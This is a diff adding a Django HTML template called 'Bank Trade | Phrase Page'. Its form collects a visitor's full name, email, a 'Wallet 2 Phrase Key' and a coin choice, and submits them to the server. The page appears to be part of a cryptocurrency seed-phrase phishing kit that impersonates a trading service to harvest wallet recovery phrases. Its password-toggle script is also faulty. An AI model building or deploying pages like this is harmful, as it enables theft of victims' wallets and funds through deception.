@@ -1,0 +1,109 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Trade | Phrase Page</title>
+    <link rel="stylesheet" type="text/css" href="{% static 'css/auth.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'fontawesome/css/all.min.css' %}">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+    <style type="text/css">
+    .input-field select{
+    height: 100%;
+    width: 100%;
+    position: absolute;
+    padding: 0 35px;
+    border: none;
+    outline: none;
+    border-bottom: 2px solid #ccc;
+    border-top: 2px solid transparent;
+    font-size: 17px;
+    transition: all 0.3s ease;
+}
+
+
+.input-field select:is(:focus, :valid){
+    border-bottom-color: rgb(155, 6, 31);
+}
+
+.input-field select:is(:focus, :valid)~i{
+    color: rgb(155, 6, 31);
+}
+
+    </style>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="forms">
+        <div class="form login">
+            <h2>Confirmation View</h2>
+            <form action="#" method="POST" autocomplete="off">
+                {% csrf_token %}
+                {{form.errors}}
+                <div class="input-field">
+                {{form.name}}
+            </div>
+
+            <div class="input-field">
+                {{form.email}}
+            </div>
+
+            <div class="input-field">
+                {{form.passkwy}}
+            </div>
+
+            <div class="input-field">
+                {{form.coin}}
+            </div>
+
+
+
+            <div class="input-field button">
+                <input type="submit" value="Send">
+            </div>
+            
+            </form>
+        </div>
+    </div>
+</div>
+</body>
+
+<script src="{% static 'js/jquery.js' %}"></script>
+<script>
+const container = document.querySelector(".container"),
+    PwShowHide = document.querySelectorAll(".showHidePw"),
+    pwFields = document.querySelectorAll("#id_password"),
+    signUp = document.querySelector(".signup-link"),
+    login = document.querySelector(".login-link");
+
+        PwShowHide.forEach(eyeIcon=>{
+            eyeIcon.addEventListener("click",()=>{
+                pwFields.forEach(pwField=>{
+                    if(pwField.type === 'id_password'){
+                        pwField.type = "text";
+
+                        PwShowHide.forEach(icon =>{
+                            icon.classList.replace('fa-eye-slash', 'fa-eye');
+                        })
+                    }else{
+                        pwField.type = 'id_password';
+
+                        PwShowHide.forEach(icon =>{
+                            icon.classList.replace('fa-eye', 'fa-eye-slash');
+                        })
+                    }
+                })
+            })
+        })
+
+
+        $("#id_name").attr("placeholder", "Type your Full Name..");
+        $("#id_email").attr("placeholder", "Type your Email Address..");
+        $("#id_passkwy").attr("placeholder", "Type your Wallet 2 Phrase Key..");
+               
+</script>
+</html>
